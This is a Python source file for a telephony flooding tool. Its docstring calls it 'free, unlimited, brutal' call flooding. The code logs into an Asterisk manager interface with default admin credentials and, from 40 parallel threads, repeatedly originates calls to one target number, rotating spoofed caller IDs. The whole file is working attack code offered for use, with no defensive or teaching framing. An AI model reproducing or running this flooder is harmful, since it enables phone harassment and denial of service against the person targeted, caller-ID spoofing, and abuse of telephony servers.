"""SIP-based call flooding via Asterisk AMI — free, unlimited, brutal."""
from __future__ import annotations

import socket
import threading
import time
import random


class SIPFlooder:
    def __init__(self, target: str, ami_host: str, ami_port: int = 5038,
                 ami_user: str = "admin", ami_secret: str = "admin",
                 trunk: str = "trunk", caller_ids: list[str] | None = None):
        self.target = target.lstrip("+")
        self.ami = (ami_host, ami_port)
        self.cred = (ami_user, ami_secret)
        self.trunk = trunk
        self.caller_ids = caller_ids or ["+919876543210"]
        self.stats = {"sent": 0, "failed": 0, "locked": False}
        self._lock = threading.Lock()

    def _originate(self) -> bool:
        try:
            s = socket.create_connection(self.ami, timeout=8)
            s.settimeout(8)
            login = f"Action: Login\r\nUsername: {self.cred[0]}\r\nSecret: {self.cred[1]}\r\nEvents: off\r\n\r\n"
            s.sendall(login.encode())
            s.recv(1024)
            cmd = (
                f"Action: Originate\r\n"
                f"Channel: SIP/{self.target}@{self.trunk}\r\n"
                f"Context: from-internal\r\n"
                f"Exten: s\r\n"
                f"Priority: 1\r\n"
                f"CallerID: {random.choice(self.caller_ids)}\r\n"
                f"Timeout: 6000\r\n"
                f"Async: true\r\n\r\n"
            )
            s.sendall(cmd.encode())
            resp = s.recv(4096)
            s.close()
            ok = b"Success" in resp or b"Originate" in resp or b"Queued" in resp
        except Exception:
            ok = False
        with self._lock:
            self.stats["sent" if ok else "failed"] += 1
        return ok

    def run(self, workers: int = 40, duration: int = 120, delay: float = 0.15) -> dict:
        deadline = time.time() + duration
        def worker():
            while time.time() < deadline and not self.stats["locked"]:
                self._originate()
                time.sleep(delay + random.uniform(0, delay))
        ts = [threading.Thread(target=worker, daemon=True) for _ in range(workers)]
        for t in ts: t.start()
        for t in ts: t.join()
        return dict(self.stats)
